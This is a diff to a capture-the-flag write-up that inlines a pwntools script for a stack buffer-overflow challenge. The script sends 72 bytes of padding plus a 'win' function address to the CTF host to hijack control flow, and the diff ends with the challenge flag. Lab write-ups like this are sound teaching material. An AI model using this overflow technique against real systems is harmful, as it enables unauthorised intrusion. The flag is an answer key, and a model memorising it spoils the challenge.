@@ -17,7 +17,25 @@ We just fill the offset starting from the buffer that the software fills necessa
 That's it.
 By executing the function, the software gives us the flag.
 
-Here's payload injection: [hack](hack.py)
+```python
+from pwn import *
+import sys
+import struct
+import os
+
+context.arch = 'amd64'
+
+host = "shell.actf.co"
+port = 21830
+conn = remote(host, port)
+
+win = 0x401196
+
+payload = b"A" * 72
+payload += struct.pack("L", win)
+conn.sendline(payload)
+conn.interactive()
+```
 
 
 #### **FLAG >>** `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`
